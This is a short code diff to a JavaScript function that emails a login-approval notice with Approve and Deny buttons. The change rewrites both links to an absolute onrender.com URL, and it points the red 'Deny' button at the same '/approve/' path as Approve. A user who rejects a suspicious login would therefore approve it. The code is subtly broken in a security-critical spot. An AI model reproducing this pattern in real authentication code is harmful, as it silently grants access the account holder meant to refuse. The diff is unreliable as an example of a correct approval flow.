@@ -24,8 +24,9 @@ async function sendLoginNotification(ipAddress = "Unknown", requestId = "N/A") {
                 <p><strong>IP Address:</strong> ${ipAddress}</p>
                 <p><strong>Request ID:</strong> ${requestId}</p>
                 <p>
-                  <a href="/approve/${requestId}" style="padding:10px;background:green;color:white;text-decoration:none;">Approve</a>
-<a href="/deny/${requestId}" style="padding:10px;background:red;color:white;text-decoration:none;margin-left:10px;">Deny</a>
+
+                  <a href="https://secret-code.onrender.com/approve/${requestId}" style="padding:10px;background:green;color:white;text-decoration:none;">Approve</a>
+<a href="https://secret-code.onrender.com/approve/${requestId}" style="padding:10px;background:red;color:white;text-decoration:none;margin-left:10px;">Deny</a>
 
 
                 </p>
